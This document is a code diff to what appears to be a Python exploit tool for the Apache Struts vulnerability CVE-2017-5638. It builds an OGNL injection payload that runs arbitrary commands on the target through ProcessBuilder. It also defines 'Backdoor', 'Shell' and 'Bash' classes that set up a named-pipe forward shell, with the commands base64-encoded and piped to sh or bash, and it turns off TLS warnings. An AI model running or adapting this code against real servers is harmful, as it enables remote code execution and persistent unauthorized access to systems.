@@ -3,11 +3,14 @@
 from abc import ABCMeta, abstractmethod
 from base64 import b64encode
 import requests
+from requests.packages.urllib3 import disable_warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from threading import Thread
 from time import sleep
 from sys import stderr
 from os import environ, _exit
 
+disable_warnings(InsecureRequestWarning)
 
 class Backdoor(metaclass=ABCMeta):
     @abstractmethod
@@ -54,8 +57,7 @@ class CVE_2017_5638:
         payload += "(#ognlUtil.getExcludedClasses().clear())."
         payload += "(#context.setMemberAccess(#dm))))."
         payload += f"(#cmd='{command}')."
-        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
-        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+        payload += "(#cmds={'/bin/bash','-c',#cmd})."
         payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
         payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
         payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
@@ -91,12 +93,10 @@ class Shell(Backdoor):
         return self._backdoor.system(command)
 
     def setup(self):
-        command = [
-                f'rm {self.inpath} {self.outpath}',
-                f'mkfifo {self.inpath}',
-                f'tail -f {self.inpath} | sh > {self.outpath} 2>&1'
-        ]
-        command = ';'.join(command)
+        command = ''
+        command += f'rm {self.inpath} {self.outpath};'
+        command += f'mkfifo {self.inpath};'
+        command += f'tail -f {self.inpath} | sh > {self.outpath} 2>&1;'
         command = b64encode(command.encode()).decode()
         command =f'echo -n {command} | base64 -d | sh'
         self.system(command)
@@ -122,14 +122,11 @@ class Bash(Shell):
         super().__init__(backdoor, inpath, outpath)
 
     def setup(self):
-        command = [
-                f'rm {self.inpath} {self.outpath}',
-                f'mkfifo {self.inpath} {self.outpath}',
-                f'exec 3<>{self.outpath}',
-                f'tail -f {self.inpath} | bash > {self.outpath} 2>&1'
-        ]
-
-        command = ';'.join(command)
+        command = ''
+        command += f'rm {self.inpath} {self.outpath};'
+        command += f'mkfifo {self.inpath} {self.outpath};'
+        command += f'exec 3<>{self.outpath};'
+        command += f'tail -f {self.inpath} | bash > {self.outpath} 2>&1;'
         command = b64encode(command.encode()).decode()
         command =f'echo -n {command} | base64 -d | bash'
         self.system(command)
